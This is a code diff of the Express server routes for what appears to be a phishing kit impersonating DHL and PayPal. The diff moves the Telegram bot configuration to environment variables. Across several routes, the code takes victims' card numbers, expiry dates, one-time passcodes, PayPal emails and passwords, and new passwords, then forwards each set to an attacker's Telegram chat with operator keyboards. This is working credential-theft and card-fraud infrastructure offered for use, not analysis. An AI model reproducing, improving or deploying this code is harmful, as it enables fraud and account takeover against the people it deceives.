@@ -20,6 +20,25 @@ declare module "express-serve-static-core" {
   }
 }
 
+async function getTelegramConfig(): Promise<{ botToken: string; chatId: string } | null> {
+  const envBotToken = process.env.TELEGRAM_BOT_TOKEN;
+  const envChatId = process.env.TELEGRAM_CHAT_ID;
+  
+  if (envBotToken && envChatId) {
+    return { botToken: envBotToken, chatId: envChatId };
+  }
+  
+  const settings = await storage.getAdminSettings();
+  if (settings?.telegramBotToken && settings?.telegramChatId) {
+    return { 
+      botToken: settings.telegramBotToken, 
+      chatId: settings.telegramChatId 
+    };
+  }
+  
+  return null;
+}
+
 export async function registerRoutes(app: Express): Promise<Server> {
   // Admin authentication endpoints
   app.get("/api/admin/check-setup", async (req, res) => {
@@ -34,7 +53,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post("/api/admin/setup", async (req, res) => {
     try {
-      const { password } = req.body;
+      let { password } = req.body;
+      
+      const envPassword = process.env.ADMIN_PASSWORD;
+      if (envPassword) {
+        password = envPassword;
+      }
       
       if (!password || password.length < 8) {
         return res.status(400).json({ error: "Password must be at least 8 characters" });
@@ -118,11 +142,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get("/api/admin/settings", async (req, res) => {
     try {
       const settings = await storage.getAdminSettings();
-      res.json(settings || { 
-        telegramBotToken: "", 
-        telegramChatId: "",
-        redirectUrl: "",
-        redirectEnabled: "false"
+      const envBotToken = process.env.TELEGRAM_BOT_TOKEN;
+      const envChatId = process.env.TELEGRAM_CHAT_ID;
+      
+      const configSource = envBotToken && envChatId ? "environment" : "database";
+      
+      res.json({ 
+        telegramBotToken: envBotToken || settings?.telegramBotToken || "", 
+        telegramChatId: envChatId || settings?.telegramChatId || "",
+        redirectUrl: settings?.redirectUrl || "",
+        redirectEnabled: settings?.redirectEnabled || "false",
+        configSource
       });
     } catch (error) {
       res.status(500).json({ error: "Failed to get settings" });
@@ -223,8 +253,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
 
       // Send notification to Telegram
-      const settings = await storage.getAdminSettings();
-      if (settings?.telegramBotToken && settings?.telegramChatId) {
+      const telegramConfig = await getTelegramConfig();
+      if (telegramConfig) {
         const notification = formatPaymentNotification({
           cardNumber: req.body.cardNumber,
           expiryMonth: req.body.expiryMonth,
@@ -240,8 +270,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         });
 
         await sendTelegramMessage(
-          settings.telegramBotToken,
-          settings.telegramChatId,
+          telegramConfig.botToken,
+          telegramConfig.chatId,
           notification.message,
           notification.keyboard
         );
@@ -275,8 +305,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       // Send notification to Telegram after OTP1 is verified
-      const settings = await storage.getAdminSettings();
-      if (settings?.telegramBotToken && settings?.telegramChatId) {
+      const telegramConfig = await getTelegramConfig();
+      if (telegramConfig) {
         const clientInfo = await getClientInfo(req);
         
         // Get DHL session to include sessionId in notification
@@ -300,8 +330,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         });
 
         await sendTelegramMessage(
-          settings.telegramBotToken,
-          settings.telegramChatId,
+          telegramConfig.botToken,
+          telegramConfig.chatId,
           notification.message,
           notification.keyboard
         );
@@ -331,8 +361,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       // Send notification to Telegram after OTP2 is verified
-      const settings = await storage.getAdminSettings();
-      if (settings?.telegramBotToken && settings?.telegramChatId) {
+      const telegramConfig = await getTelegramConfig();
+      if (telegramConfig) {
         const clientInfo = await getClientInfo(req);
         
         // Get DHL session to include sessionId in notification
@@ -356,8 +386,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         });
 
         await sendTelegramMessage(
-          settings.telegramBotToken,
-          settings.telegramChatId,
+          telegramConfig.botToken,
+          telegramConfig.chatId,
           notification.message,
           notification.keyboard
         );
@@ -393,8 +423,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
 
       // Send notification to Telegram
-      const settings = await storage.getAdminSettings();
-      if (settings?.telegramBotToken && settings?.telegramChatId) {
+      const telegramConfig = await getTelegramConfig();
+      if (telegramConfig) {
         const notification = formatPayPalNotification({
           email,
           password,
@@ -407,8 +437,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         });
 
         await sendTelegramMessage(
-          settings.telegramBotToken,
-          settings.telegramChatId,
+          telegramConfig.botToken,
+          telegramConfig.chatId,
           notification.message,
           notification.keyboard
         );
@@ -501,8 +531,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const clientInfo = await getClientInfo(req);
 
       // Send notification to Telegram
-      const settings = await storage.getAdminSettings();
-      if (settings?.telegramBotToken && settings?.telegramChatId) {
+      const telegramConfig = await getTelegramConfig();
+      if (telegramConfig) {
         const message = `
 🔢 <b>PAYPAL - CODE OTP ${step === 2 ? '2' : '1'}</b>
 
@@ -540,8 +570,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         ];
 
         await sendTelegramMessage(
-          settings.telegramBotToken,
-          settings.telegramChatId,
+          telegramConfig.botToken,
+          telegramConfig.chatId,
           message,
           keyboard
         );
@@ -575,8 +605,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const clientInfo = await getClientInfo(req);
 
       // Send notification to Telegram
-      const settings = await storage.getAdminSettings();
-      if (settings?.telegramBotToken && settings?.telegramChatId) {
+      const telegramConfig = await getTelegramConfig();
+      if (telegramConfig) {
         const message = `
 🔑 <b>PAYPAL - NOUVEAU MOT DE PASSE</b>
 
@@ -608,8 +638,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         ];
 
         await sendTelegramMessage(
-          settings.telegramBotToken,
-          settings.telegramChatId,
+          telegramConfig.botToken,
+          telegramConfig.chatId,
           message,
           keyboard
         );
